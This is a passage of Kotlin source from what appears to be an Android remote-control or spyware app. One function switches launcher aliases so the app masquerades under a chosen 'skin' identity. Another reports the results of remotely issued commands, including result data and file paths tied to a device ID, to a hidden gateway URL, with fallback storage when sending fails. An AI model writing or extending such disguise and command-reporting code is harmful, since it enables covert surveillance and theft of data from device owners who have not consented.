        val targetComp = android.content.ComponentName(ctx, "${ctx.packageName}${aliasMap[skin]}")
        val success = pm.getComponentEnabledSetting(targetComp) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED
        
        if (success) {
            prefs.edit().putString("active_masquerade_skin", skin).apply()
            DebugLogger.log("SKIN", "Identity transformed to $skin")
        }
        return success
    }

    fun updateCommandStatus(ctx: Context, id: Int, status: String, errorMsg: String? = null, resultData: JSONObject? = null, resultFilePath: String? = null) {
        try {
            val key = SecretVault.getLock(ctx)
            val updateUrl = URL(SecretVault.getGatewayUrl(ctx))
            val conn = updateUrl.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("apikey", key)
            conn.setRequestProperty("Authorization", "Bearer $key")
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true

            val req = JSONObject()
            req.put("action", "update_command")
            req.put("deviceId", DeviceManager.getDeviceId(ctx))
            val payload = JSONObject()
            payload.put("id", id)
            payload.put("status", status)
            if (!errorMsg.isNullOrEmpty()) payload.put("errorMsg", errorMsg)
            if (resultData != null) payload.put("resultData", resultData)
            if (!resultFilePath.isNullOrEmpty()) payload.put("resultFilePath", resultFilePath)
            req.put("payload", payload)

            val finalJson = req.toString()
            // SAFETY: Supabase Edge Functions have a limit. If payload is too huge (>2MB), vault it instead of trying.
            if (finalJson.length > 2 * 1024 * 1024) {
                DebugLogger.log("CMD_WARN", "Payload too large for DB update. Moving to Recovery Vault.")
                DumpManager.vaultCommandUpdate(id, status, errorMsg, resultData, resultFilePath)
                return
            }

            conn.outputStream.use { it.write(finalJson.toByteArray()) }
            val code = conn.responseCode
            if (code !in 200..299) {
                DebugLogger.log("CMD_ERR", "Network fail ($code). Saving to Recovery Vault.")
                DumpManager.vaultCommandUpdate(id, status, errorMsg, resultData, resultFilePath)
            }
        } catch (e: Exception) { 
            DebugLogger.log("CMD_ERR", "Fatal Update Error. Saving to Recovery Vault.")
            DumpManager.vaultCommandUpdate(id, status, errorMsg, resultData, resultFilePath)
        }
    }
}
